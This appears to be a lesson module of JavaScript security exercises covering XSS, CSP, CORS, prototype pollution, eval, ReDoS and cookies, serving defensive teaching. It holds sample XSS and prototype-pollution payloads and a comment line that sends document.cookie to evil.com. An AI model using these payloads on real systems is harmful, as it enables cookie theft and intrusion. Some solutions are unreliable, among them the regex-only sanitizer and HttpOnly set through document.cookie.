import type { LessonSection } from '../../../stores/app.svelte.ts';

export const section: LessonSection = {
  id: 'js-security',
  title: '46. Security',
  explanation: `## Security

Web security is not optional. JavaScript runs in an inherently hostile environment (the browser), and even server-side JS must guard against injection, data leaks, and abuse.

\`\`\`javascript
// XSS (Cross-Site Scripting) -- injecting malicious scripts
// DANGEROUS: element.innerHTML = userInput;
// SAFE: element.textContent = userInput;

// Content Security Policy (CSP) -- HTTP header that restricts script sources
// Content-Security-Policy: default-src 'self'; script-src 'self'

// CORS -- browser enforces same-origin policy
// Server must send Access-Control-Allow-Origin header

// Prototype pollution -- attackers inject __proto__ properties
// DANGEROUS: merge(target, JSON.parse(untrusted))
// SAFE: validate keys, use Object.create(null)

// eval() -- executes arbitrary code, never use with user input
// DANGEROUS: eval(userInput)
// SAFE: JSON.parse(userInput)
\`\`\`

Defense in depth: validate input, encode output, use CSP, and never trust client-side data.`,
  exercises: [
    {
      id: 'js-security-1',
      title: 'XSS Prevention',
      type: 'fill-blank',
      difficulty: 'beginner',
      language: 'javascript',
      goal: 'Fill in the blanks to prevent XSS when displaying user input.',
      skeleton: `// DANGEROUS -- allows script injection
const userInput = '<img src=x onerror="alert(1)">';
element.innerHTML = userInput; // XSS!

// SAFE -- use __BLANK__ instead of innerHTML
element.__BLANK__ = userInput;
// Renders as literal text, not HTML

// For cases where you NEED HTML, __BLANK__ the input first
// using a library like DOMPurify
const clean = DOMPurify.__BLANK__(userInput);
element.innerHTML = clean;`,
      solution: `// DANGEROUS -- allows script injection
const userInput = '<img src=x onerror="alert(1)">';
element.innerHTML = userInput; // XSS!

// SAFE -- use textContent instead of innerHTML
element.textContent = userInput;
// Renders as literal text, not HTML

// For cases where you NEED HTML, sanitize the input first
// using a library like DOMPurify
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;`,
      hints: [
        'textContent treats the value as plain text -- no HTML parsing.',
        'When you must render HTML, sanitize it first to strip dangerous elements.',
        'DOMPurify.sanitize() removes script tags, event handlers, and other XSS vectors.',
      ],
      concepts: ['XSS', 'textContent', 'innerHTML', 'DOMPurify', 'sanitization'],
    },
    {
      id: 'js-security-2',
      title: 'innerHTML Dangers',
      type: 'predict-output',
      difficulty: 'beginner',
      language: 'javascript',
      goal: 'Predict which of these innerHTML assignments are vulnerable to XSS.',
      skeleton: `const name = '<script>alert("xss")</script>';
const bio = '<img src=x onerror="alert(1)">';
const age = '25';
const link = '<a href="javascript:alert(1)">Click</a>';

// Which are vulnerable?
element1.innerHTML = name;     // 1
element2.innerHTML = bio;      // 2
element3.innerHTML = age;      // 3
element4.innerHTML = link;     // 4
element5.textContent = bio;    // 5`,
      solution: `const name = '<script>alert("xss")</script>';
const bio = '<img src=x onerror="alert(1)">';
const age = '25';
const link = '<a href="javascript:alert(1)">Click</a>';

// 1: NOT vulnerable via innerHTML (browsers block inline script insertion)
//    BUT the intent is malicious and other vectors could work
element1.innerHTML = name;     // Mostly safe but bad practice

// 2: VULNERABLE -- img onerror fires immediately
element2.innerHTML = bio;

// 3: SAFE -- "25" contains no HTML
element3.innerHTML = age;

// 4: VULNERABLE -- javascript: protocol in href
element4.innerHTML = link;

// 5: SAFE -- textContent never parses HTML
element5.textContent = bio;`,
      hints: [
        'innerHTML with <script> tags inserted via innerHTML actually do NOT execute in modern browsers.',
        'But event handlers like onerror on <img> DO fire -- this is the common XSS vector.',
        'javascript: protocol in href attributes is another XSS vector.',
      ],
      concepts: ['XSS vectors', 'innerHTML', 'event handlers', 'javascript protocol'],
    },
    {
      id: 'js-security-3',
      title: 'Output Encoding',
      type: 'write-function',
      difficulty: 'beginner',
      language: 'javascript',
      goal: 'Write an escapeHTML function that encodes dangerous characters to their HTML entities.',
      skeleton: `function escapeHTML(str) {
  // Replace: & < > " ' with their HTML entity equivalents
  // & -> &amp;  < -> &lt;  > -> &gt;  " -> &quot;  ' -> &#39;



}

// Test:
// escapeHTML('<script>alert("xss")</script>')
// => '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'`,
      solution: `function escapeHTML(str) {
  const entities = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  };
  return str.replace(/[&<>"']/g, (ch) => entities[ch]);
}

// Test:
// escapeHTML('<script>alert("xss")</script>')
// => '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'`,
      hints: [
        'Use a lookup object mapping each character to its HTML entity.',
        'Replace all instances using a regex with the global flag.',
        'The order matters: & must be replaced first to avoid double-encoding.',
      ],
      concepts: ['output encoding', 'HTML entities', 'XSS prevention'],
    },
    {
      id: 'js-security-4',
      title: 'CSP Basics',
      type: 'fill-blank',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Fill in the blanks to create Content Security Policy directives.',
      skeleton: `// CSP HTTP header that:
// 1. Only allows scripts from same origin
// 2. Only allows styles from same origin and Google Fonts
// 3. Only allows images from same origin and HTTPS
// 4. Blocks all inline scripts and eval

const csp = [
  "default-src __BLANK__",
  "script-src __BLANK__",
  "style-src 'self' __BLANK__",
  "img-src 'self' __BLANK__",
].join('; ');

// Set via meta tag
const meta = document.createElement('meta');
meta.httpEquiv = 'Content-Security-Policy';
meta.__BLANK__ = csp;`,
      solution: `// CSP HTTP header that:
// 1. Only allows scripts from same origin
// 2. Only allows styles from same origin and Google Fonts
// 3. Only allows images from same origin and HTTPS
// 4. Blocks all inline scripts and eval

const csp = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' https://fonts.googleapis.com",
  "img-src 'self' https:",
].join('; ');

// Set via meta tag
const meta = document.createElement('meta');
meta.httpEquiv = 'Content-Security-Policy';
meta.content = csp;`,
      hints: [
        "'self' means same origin -- scripts/styles/images from your own domain only.",
        'For Google Fonts, allow the full origin: https://fonts.googleapis.com.',
        'https: as a source allows any HTTPS URL for images.',
      ],
      concepts: ['CSP', 'Content-Security-Policy', 'same-origin', 'security headers'],
    },
    {
      id: 'js-security-5',
      title: 'CORS Understanding',
      type: 'predict-output',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Predict which fetch requests will be blocked by CORS.',
      skeleton: `// Page is served from https://myapp.com

// Request 1: Same origin
fetch('https://myapp.com/api/data');

// Request 2: Different origin, no CORS headers on server
fetch('https://other-api.com/data');

// Request 3: Different origin, server sends Access-Control-Allow-Origin: *
fetch('https://public-api.com/data');

// Request 4: Different origin with credentials
fetch('https://api.partner.com/data', { credentials: 'include' });
// Server sends: Access-Control-Allow-Origin: *

// Request 5: Different origin, preflight required (custom header)
fetch('https://api.example.com/data', {
  headers: { 'X-Custom': 'value' }
});

// Which requests succeed? Which are blocked?`,
      solution: `// Page is served from https://myapp.com

// Request 1: SUCCEEDS -- same origin, no CORS needed
fetch('https://myapp.com/api/data');

// Request 2: BLOCKED -- different origin, no CORS headers
fetch('https://other-api.com/data');

// Request 3: SUCCEEDS -- server allows all origins with *
fetch('https://public-api.com/data');

// Request 4: BLOCKED -- credentials: 'include' requires
// Access-Control-Allow-Origin to be the specific origin, not *
// Also needs Access-Control-Allow-Credentials: true
fetch('https://api.partner.com/data', { credentials: 'include' });

// Request 5: DEPENDS -- custom header triggers preflight (OPTIONS request)
// Server must respond to OPTIONS with proper Allow-Headers
fetch('https://api.example.com/data', {
  headers: { 'X-Custom': 'value' }
});`,
      hints: [
        'Same-origin requests bypass CORS entirely.',
        'Wildcard * in Access-Control-Allow-Origin does not work with credentials.',
        'Custom headers trigger a preflight OPTIONS request that must also succeed.',
      ],
      concepts: ['CORS', 'same-origin policy', 'preflight', 'credentials'],
    },
    {
      id: 'js-security-6',
      title: 'Input Validation',
      type: 'write-function',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Write a validateInput function that sanitizes and validates user input for a form, returning clean data or errors.',
      skeleton: `function validateInput(input) {
  // Input: { email, username, age, website }
  // Validate:
  //   email: must contain @, trim whitespace
  //   username: alphanumeric only, 3-20 chars, trim
  //   age: must be integer 13-120
  //   website: must start with https://
  // Return: { valid: boolean, data: cleanData, errors: string[] }



}

// Test:
// validateInput({
//   email: '  user@test.com  ',
//   username: 'alice_123',
//   age: '25',
//   website: 'https://example.com'
// })`,
      solution: `function validateInput(input) {
  const errors = [];
  const data = {};

  const email = String(input.email ?? '').trim();
  if (!email.includes('@') || email.length < 3) {
    errors.push('Invalid email');
  } else {
    data.email = email;
  }

  const username = String(input.username ?? '').trim();
  if (!/^[a-zA-Z0-9]{3,20}$/.test(username)) {
    errors.push('Username must be 3-20 alphanumeric characters');
  } else {
    data.username = username;
  }

  const age = Number(input.age);
  if (!Number.isInteger(age) || age < 13 || age > 120) {
    errors.push('Age must be an integer between 13 and 120');
  } else {
    data.age = age;
  }

  const website = String(input.website ?? '').trim();
  if (website && !website.startsWith('https://')) {
    errors.push('Website must use HTTPS');
  } else {
    data.website = website;
  }

  return { valid: errors.length === 0, data, errors };
}

// Test:
// validateInput({
//   email: '  user@test.com  ',
//   username: 'alice123',
//   age: '25',
//   website: 'https://example.com'
// })`,
      hints: [
        'Always trim and coerce inputs before validation.',
        'Use regex for pattern matching: /^[a-zA-Z0-9]{3,20}$/ for alphanumeric.',
        'Convert age to Number and check Number.isInteger for integer validation.',
      ],
      concepts: ['input validation', 'sanitization', 'regex', 'defense in depth'],
    },
    {
      id: 'js-security-7',
      title: 'Prototype Pollution',
      type: 'fix-bug',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Fix the merge function that is vulnerable to prototype pollution.',
      skeleton: `// BUG: Vulnerable to prototype pollution
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attack:
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
const user = {};
merge(user, malicious);
// Now ALL objects have isAdmin === true!
console.log({}.isAdmin); // true`,
      solution: `// FIX: Block dangerous keys and use hasOwnProperty check
function merge(target, source) {
  const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);

  for (const key of Object.keys(source)) {
    if (BLOCKED.has(key)) continue;

    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = {};
      }
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attack now fails:
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
const user = {};
merge(user, malicious);
console.log({}.isAdmin); // undefined`,
      hints: [
        'Block keys like __proto__, constructor, and prototype.',
        'Use Object.keys() instead of for...in to only iterate own properties.',
        'Also check that source[key] is not an array before recursing.',
      ],
      concepts: ['prototype pollution', 'Object.keys', 'security', 'deep merge'],
    },
    {
      id: 'js-security-8',
      title: 'JSON.parse Safety',
      type: 'write-function',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Write a safeJsonParse function that parses JSON with a reviver to block prototype pollution keys.',
      skeleton: `function safeJsonParse(jsonString) {
  // Parse JSON but reject any keys that could cause prototype pollution
  // Block: __proto__, constructor, prototype
  // Return the parsed object or throw an error



}

// Test:
// safeJsonParse('{"name": "Alice"}')  // { name: 'Alice' }
// safeJsonParse('{"__proto__": {"admin": true}}')  // throws Error`,
      solution: `function safeJsonParse(jsonString) {
  const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);

  return JSON.parse(jsonString, (key, value) => {
    if (BLOCKED.has(key)) {
      throw new Error(\`Blocked dangerous key: \${key}\`);
    }
    return value;
  });
}

// Test:
// safeJsonParse('{"name": "Alice"}')  // { name: 'Alice' }
// safeJsonParse('{"__proto__": {"admin": true}}')  // throws Error`,
      hints: [
        'JSON.parse accepts a reviver function as its second argument.',
        'The reviver is called for every key-value pair during parsing.',
        'Throw an error when a blocked key is encountered.',
      ],
      concepts: ['JSON.parse', 'reviver', 'prototype pollution', 'safe parsing'],
    },
    {
      id: 'js-security-9',
      title: 'eval Dangers',
      type: 'fix-bug',
      difficulty: 'beginner',
      language: 'javascript',
      goal: 'Fix the code that uses eval to process user input.',
      skeleton: `// BUG: eval executes arbitrary code from user input
function calculate(expression) {
  // User types math expressions like "2 + 3 * 4"
  return eval(expression);
}

// An attacker could pass:
// calculate("process.exit(1)")
// calculate("fetch('https://evil.com/steal?cookie=' + document.cookie)")`,
      solution: `// FIX: Parse the expression safely without eval
function calculate(expression) {
  // Only allow numbers, operators, parentheses, and whitespace
  const sanitized = expression.replace(/\\s/g, '');
  if (!/^[\\d+\\-*/().]+$/.test(sanitized)) {
    throw new Error('Invalid expression');
  }

  // Use Function constructor with strict validation
  // (still safer than raw eval, but the regex limits input)
  return new Function(\`"use strict"; return (\${sanitized})\`)();
}

// Attacker payloads are now rejected:
// calculate("process.exit(1)") // Error: Invalid expression
// calculate("fetch(...)") // Error: Invalid expression`,
      hints: [
        'Never use eval() with user input -- it can execute arbitrary code.',
        'Validate the expression with a regex whitelist of allowed characters.',
        'For production, use a proper math parser library instead of Function constructor.',
      ],
      concepts: ['eval', 'code injection', 'input validation', 'safe alternatives'],
    },
    {
      id: 'js-security-10',
      title: 'ReDoS Prevention',
      type: 'fix-bug',
      difficulty: 'advanced',
      language: 'javascript',
      goal: 'Fix the regex that is vulnerable to Regular Expression Denial of Service (ReDoS).',
      skeleton: `// BUG: This regex causes exponential backtracking on crafted input
function validateEmail(email) {
  // This regex has catastrophic backtracking with:
  // "aaaaaaaaaaaaaaaaaa@" (many a's followed by invalid ending)
  const emailRegex = /^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\\.[a-zA-Z]+$/;
  return emailRegex.test(email);
}

// This takes exponentially longer as input grows:
// validateEmail('a'.repeat(25) + '@');  // hangs!`,
      solution: `// FIX: Remove nested quantifiers that cause catastrophic backtracking
function validateEmail(email) {
  // Linear-time regex -- no nested quantifiers
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
  return emailRegex.test(email);
}

// Now executes in linear time regardless of input:
// validateEmail('a'.repeat(25) + '@');  // false, instantly`,
      hints: [
        'The problem is nested quantifiers: ([a-zA-Z0-9]+)+ has a + inside a +.',
        'Remove nesting: use a single [a-zA-Z0-9._%+-]+ character class.',
        'Avoid patterns where the engine can match the same character multiple ways.',
      ],
      concepts: ['ReDoS', 'catastrophic backtracking', 'regex optimization', 'security'],
    },
    {
      id: 'js-security-11',
      title: 'Timing Attack Awareness',
      type: 'write-function',
      difficulty: 'advanced',
      language: 'javascript',
      goal: 'Write a constant-time string comparison function to prevent timing attacks on token verification.',
      skeleton: `// VULNERABLE: short-circuits on first mismatch, leaking info via timing
function insecureCompare(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) {
    if (a[i] !== b[i]) return false;  // early return leaks info
  }
  return true;
}

// SECURE: constant-time comparison
function secureCompare(a, b) {
  // Compare in constant time regardless of where differences are
  // Always iterate the full length, accumulate differences



}`,
      solution: `function insecureCompare(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) {
    if (a[i] !== b[i]) return false;
  }
  return true;
}

function secureCompare(a, b) {
  if (a.length !== b.length) return false;

  let mismatch = 0;
  for (let i = 0; i < a.length; i++) {
    mismatch |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return mismatch === 0;
}`,
      hints: [
        'XOR each character pair and OR the results into an accumulator.',
        'If any characters differ, the XOR produces a non-zero value.',
        'The loop always runs for the full length -- no early return on mismatch.',
      ],
      concepts: ['timing attack', 'constant-time comparison', 'XOR', 'bitwise OR'],
    },
    {
      id: 'js-security-12',
      title: 'Secure Cookies',
      type: 'fill-blank',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Fill in the blanks to set a secure cookie with all recommended security flags.',
      skeleton: `// Set a session cookie with security best practices
document.cookie = [
  'session=abc123',
  '__BLANK__',          // Only sent over HTTPS
  '__BLANK__',          // Not accessible via JavaScript
  'SameSite=__BLANK__', // Prevent CSRF
  'Path=/',
  'Max-Age=3600',
].join('; ');`,
      solution: `// Set a session cookie with security best practices
document.cookie = [
  'session=abc123',
  'Secure',             // Only sent over HTTPS
  'HttpOnly',           // Not accessible via JavaScript
  'SameSite=Strict',    // Prevent CSRF
  'Path=/',
  'Max-Age=3600',
].join('; ');`,
      hints: [
        'Secure ensures the cookie is only sent over HTTPS connections.',
        'HttpOnly prevents JavaScript from reading the cookie (blocks XSS cookie theft).',
        'SameSite=Strict prevents the cookie from being sent in cross-site requests.',
      ],
      concepts: ['secure cookies', 'HttpOnly', 'Secure', 'SameSite', 'CSRF'],
    },
    {
      id: 'js-security-13',
      title: 'Subresource Integrity',
      type: 'fill-blank',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Fill in the blanks to add Subresource Integrity (SRI) to a CDN script tag.',
      skeleton: `// Without SRI -- CDN compromise affects your site
// <script src="https://cdn.example.com/lib.js"></script>

// With SRI -- browser verifies the hash before executing
const script = document.createElement('script');
script.src = 'https://cdn.example.com/lib.js';
script.__BLANK__ = 'sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxAh8ME=';
script.__BLANK__ = 'anonymous';
document.head.appendChild(script);`,
      solution: `// Without SRI -- CDN compromise affects your site
// <script src="https://cdn.example.com/lib.js"></script>

// With SRI -- browser verifies the hash before executing
const script = document.createElement('script');
script.src = 'https://cdn.example.com/lib.js';
script.integrity = 'sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxAh8ME=';
script.crossOrigin = 'anonymous';
document.head.appendChild(script);`,
      hints: [
        'The integrity attribute holds the cryptographic hash of the expected file.',
        'crossOrigin must be set to "anonymous" for SRI to work with CDN resources.',
        'If the file does not match the hash, the browser refuses to execute it.',
      ],
      concepts: ['SRI', 'subresource integrity', 'CDN security', 'cryptographic hash'],
    },
    {
      id: 'js-security-14',
      title: 'Trusted Types',
      type: 'write-function',
      difficulty: 'advanced',
      language: 'javascript',
      goal: 'Write a Trusted Types policy that sanitizes HTML before it can be assigned to innerHTML.',
      skeleton: `// Create a Trusted Types policy
const policy = trustedTypes.createPolicy('sanitize', {
  createHTML(input) {
    // Sanitize the HTML string
    // Remove script tags, event handlers, and javascript: URLs
    // Return the cleaned string



  },
});

// Usage -- only sanitized HTML can be assigned
// element.innerHTML = policy.createHTML(userInput);`,
      solution: `const policy = trustedTypes.createPolicy('sanitize', {
  createHTML(input) {
    return input
      .replace(/<script[\\s\\S]*?<\\/script>/gi, '')
      .replace(/\\bon\\w+\\s*=\\s*(['"]?).*?\\1/gi, '')
      .replace(/javascript\\s*:/gi, '')
      .replace(/<iframe[\\s\\S]*?<\\/iframe>/gi, '')
      .replace(/<object[\\s\\S]*?<\\/object>/gi, '');
  },
});

// Usage -- only sanitized HTML can be assigned
// element.innerHTML = policy.createHTML(userInput);`,
      hints: [
        'Trusted Types enforce that only sanitized values can be used in dangerous sinks.',
        'Remove <script> tags, on* event handlers, and javascript: protocols.',
        'Use case-insensitive regex with the gi flag to catch variations.',
      ],
      concepts: ['Trusted Types', 'DOM XSS', 'policy', 'sanitization'],
    },
    {
      id: 'js-security-15',
      title: 'Security Headers',
      type: 'predict-output',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Predict what each security header prevents.',
      skeleton: `// Match each header to its purpose:

const headers = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
  'X-XSS-Protection': '0',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
};

// What does each header prevent?
// 1. X-Content-Type-Options: nosniff
// 2. X-Frame-Options: DENY
// 3. Strict-Transport-Security
// 4. X-XSS-Protection: 0
// 5. Referrer-Policy`,
      solution: `const headers = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
  'X-XSS-Protection': '0',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
};

// 1. X-Content-Type-Options: nosniff
//    Prevents MIME-type sniffing -- browser must respect Content-Type header

// 2. X-Frame-Options: DENY
//    Prevents clickjacking -- page cannot be loaded in an iframe

// 3. Strict-Transport-Security (HSTS)
//    Forces HTTPS for 1 year -- browser refuses HTTP connections

// 4. X-XSS-Protection: 0
//    Disables browser's built-in XSS filter (it's buggy and can create vulnerabilities)

// 5. Referrer-Policy: strict-origin-when-cross-origin
//    Controls how much URL info is sent in the Referer header to other sites`,
      hints: [
        'nosniff prevents the browser from guessing file types differently than declared.',
        'X-Frame-Options: DENY prevents your page from being embedded in iframes (clickjacking).',
        'HSTS forces the browser to only use HTTPS for your domain.',
      ],
      concepts: ['security headers', 'HSTS', 'clickjacking', 'MIME sniffing'],
    },
    {
      id: 'js-security-16',
      title: 'HTTPS Enforcement',
      type: 'fill-blank',
      difficulty: 'beginner',
      language: 'javascript',
      goal: 'Fill in the blanks to redirect HTTP traffic to HTTPS.',
      skeleton: `// Client-side redirect (not ideal -- server-side HSTS is better)
if (window.location.__BLANK__ !== 'https:') {
  window.location.__BLANK__ = window.location.href.replace(
    'http://',
    '__BLANK__'
  );
}

// Check if current connection is secure
const isSecure = window.__BLANK__;
console.log('Secure context:', isSecure);`,
      solution: `// Client-side redirect (not ideal -- server-side HSTS is better)
if (window.location.protocol !== 'https:') {
  window.location.href = window.location.href.replace(
    'http://',
    'https://'
  );
}

// Check if current connection is secure
const isSecure = window.isSecureContext;
console.log('Secure context:', isSecure);`,
      hints: [
        'window.location.protocol returns the scheme: "http:" or "https:".',
        'Replace the protocol in the URL and assign to location.href to redirect.',
        'window.isSecureContext is a boolean that checks if the page is on HTTPS.',
      ],
      concepts: ['HTTPS', 'redirect', 'isSecureContext', 'secure connection'],
    },
    {
      id: 'js-security-17',
      title: 'Safe Data Handling',
      type: 'write-function',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Write a function that safely handles sensitive data by clearing it from memory after use.',
      skeleton: `function withSensitiveData(getData, process) {
  // 1. Get the sensitive data
  // 2. Process it
  // 3. Clear it from memory as best as possible
  // 4. Return the result of processing



}

// Usage:
// const hash = withSensitiveData(
//   () => getUserPassword(),
//   (password) => crypto.subtle.digest('SHA-256', new TextEncoder().encode(password))
// );`,
      solution: `function withSensitiveData(getData, process) {
  let sensitive = getData();
  try {
    const result = process(sensitive);
    return result;
  } finally {
    if (typeof sensitive === 'string') {
      sensitive = '';
    } else if (sensitive instanceof Uint8Array) {
      sensitive.fill(0);
    } else if (typeof sensitive === 'object' && sensitive !== null) {
      for (const key of Object.keys(sensitive)) {
        sensitive[key] = undefined;
      }
    }
    sensitive = null;
  }
}

// Usage:
// const hash = withSensitiveData(
//   () => getUserPassword(),
//   (password) => crypto.subtle.digest('SHA-256', new TextEncoder().encode(password))
// );`,
      hints: [
        'Use try/finally to ensure cleanup runs even if processing throws.',
        'Zero out typed arrays with .fill(0), clear objects by setting keys to undefined.',
        'Note: JavaScript GC makes true memory clearing impossible, but this reduces exposure.',
      ],
      concepts: ['sensitive data', 'memory clearing', 'try/finally', 'defense in depth'],
    },
    {
      id: 'js-security-18',
      title: 'URL Validation',
      type: 'write-function',
      difficulty: 'intermediate',
      language: 'javascript',
      goal: 'Write a function that validates URLs to prevent open redirect and javascript: protocol attacks.',
      skeleton: `function isValidRedirect(url, allowedOrigins) {
  // Validate that url is safe for redirect:
  // 1. Must be a valid URL
  // 2. Must use https: protocol (not javascript:, data:, etc.)
  // 3. Origin must be in the allowedOrigins list
  // 4. Relative paths (starting with /) are allowed
  // Return: boolean



}

// Test:
// isValidRedirect('/dashboard', [])  // true (relative)
// isValidRedirect('https://myapp.com/page', ['https://myapp.com'])  // true
// isValidRedirect('https://evil.com', ['https://myapp.com'])  // false
// isValidRedirect('javascript:alert(1)', [])  // false`,
      solution: `function isValidRedirect(url, allowedOrigins) {
  if (url.startsWith('/') && !url.startsWith('//')) {
    return true;
  }

  try {
    const parsed = new URL(url);

    if (parsed.protocol !== 'https:') {
      return false;
    }

    return allowedOrigins.includes(parsed.origin);
  } catch {
    return false;
  }
}

// Test:
// isValidRedirect('/dashboard', [])  // true (relative)
// isValidRedirect('https://myapp.com/page', ['https://myapp.com'])  // true
// isValidRedirect('https://evil.com', ['https://myapp.com'])  // false
// isValidRedirect('javascript:alert(1)', [])  // false`,
      hints: [
        'Relative paths starting with / (but not //) are safe for same-origin redirects.',
        'Use new URL(url) to parse and validate -- check protocol and origin.',
        'Reject anything that is not https: to block javascript:, data:, etc.',
      ],
      concepts: ['open redirect', 'URL validation', 'javascript protocol', 'origin check'],
    },
    {
      id: 'js-security-19',
      title: 'Secure Coding Checklist',
      type: 'refactor',
      difficulty: 'advanced',
      language: 'javascript',
      goal: 'Refactor this vulnerable user profile page to follow security best practices.',
      skeleton: `// VULNERABLE: Multiple security issues
async function renderProfile(userId) {
  const res = await fetch('http://api.example.com/users/' + userId);
  const user = await res.json();

  document.getElementById('name').innerHTML = user.name;
  document.getElementById('bio').innerHTML = user.bio;
  document.getElementById('website').innerHTML =
    '<a href="' + user.website + '">Website</a>';

  // Store auth token in localStorage
  localStorage.setItem('token', user.authToken);

  // Log analytics
  eval('analytics.track("profile_view", {id: "' + userId + '"})');
}`,
      solution: `// SECURE: All issues addressed
async function renderProfile(userId) {
  // Use HTTPS and validate the userId
  const safeId = encodeURIComponent(userId);
  const res = await fetch(\`https://api.example.com/users/\${safeId}\`);
  if (!res.ok) throw new Error('Failed to load profile');
  const user = await res.json();

  // Use textContent instead of innerHTML
  document.getElementById('name').textContent = user.name;
  document.getElementById('bio').textContent = user.bio;

  // Validate URL before creating link
  const link = document.getElementById('website');
  try {
    const url = new URL(user.website);
    if (url.protocol === 'https:') {
      const a = document.createElement('a');
      a.href = url.href;
      a.textContent = 'Website';
      a.rel = 'noopener noreferrer';
      link.replaceChildren(a);
    } else {
      link.textContent = 'Website unavailable';
    }
  } catch {
    link.textContent = 'Website unavailable';
  }

  // Use sessionStorage or HttpOnly cookie instead of localStorage for tokens
  sessionStorage.setItem('token', user.authToken);

  // Never use eval -- call analytics directly
  analytics.track('profile_view', { id: safeId });
}`,
      hints: [
        'Replace http:// with https://, innerHTML with textContent, eval with direct calls.',
        'Validate URLs before using them in href attributes.',
        'Use sessionStorage instead of localStorage for sensitive tokens (still not ideal -- HttpOnly cookies are best).',
      ],
      concepts: ['secure coding', 'XSS prevention', 'eval removal', 'HTTPS', 'URL validation'],
    },
    {
      id: 'js-security-20',
      title: 'Practical: Security Audit',
      type: 'write-function',
      difficulty: 'advanced',
      language: 'javascript',
      goal: 'Write a security audit function that scans a codebase (as a string) for common vulnerabilities and returns a report.',
      skeleton: `function securityAudit(code) {
  // Scan code string for vulnerabilities:
  // 1. eval() usage
  // 2. innerHTML assignments
  // 3. document.write
  // 4. http:// URLs (should be https)
  // 5. __proto__ access
  // 6. unescaped template literal injections into HTML
  // Return: { vulnerabilities: [{ type, line, severity, message }], score: 0-100 }



}

// Test:
// securityAudit(\`
//   element.innerHTML = userInput;
//   eval(data);
//   fetch('http://api.com/data');
// \`)`,
      solution: `function securityAudit(code) {
  const rules = [
    { pattern: /\\beval\\s*\\(/g, type: 'eval', severity: 'critical', message: 'eval() can execute arbitrary code' },
    { pattern: /\\.innerHTML\\s*=/g, type: 'xss', severity: 'high', message: 'innerHTML assignment may allow XSS' },
    { pattern: /document\\.write\\s*\\(/g, type: 'xss', severity: 'high', message: 'document.write can inject scripts' },
    { pattern: /['"\`]http:\\/\\//g, type: 'insecure-transport', severity: 'medium', message: 'Use HTTPS instead of HTTP' },
    { pattern: /__proto__/g, type: 'prototype-pollution', severity: 'high', message: '__proto__ access is dangerous' },
    { pattern: /new\\s+Function\\s*\\(/g, type: 'code-injection', severity: 'critical', message: 'new Function() can execute arbitrary code' },
    { pattern: /\\.outerHTML\\s*=/g, type: 'xss', severity: 'high', message: 'outerHTML assignment may allow XSS' },
    { pattern: /\\.insertAdjacentHTML\\s*\\(/g, type: 'xss', severity: 'medium', message: 'insertAdjacentHTML may allow XSS' },
  ];

  const lines = code.split('\\n');
  const vulnerabilities = [];

  for (const rule of rules) {
    for (let i = 0; i < lines.length; i++) {
      const matches = lines[i].matchAll(rule.pattern);
      for (const _ of matches) {
        vulnerabilities.push({
          type: rule.type,
          line: i + 1,
          severity: rule.severity,
          message: rule.message,
        });
      }
    }
  }

  const weights = { critical: 25, high: 15, medium: 5 };
  const penalty = vulnerabilities.reduce((sum, v) => sum + (weights[v.severity] ?? 0), 0);
  const score = Math.max(0, 100 - penalty);

  return { vulnerabilities, score };
}

// Test:
// securityAudit(\`
//   element.innerHTML = userInput;
//   eval(data);
//   fetch('http://api.com/data');
// \`)`,
      hints: [
        'Define rules as regex patterns with associated metadata (type, severity, message).',
        'Scan each line against each rule, collecting matches with line numbers.',
        'Calculate a score by deducting points based on severity of findings.',
      ],
      concepts: ['security audit', 'static analysis', 'vulnerability detection', 'code scanning'],
    },
  ],
};
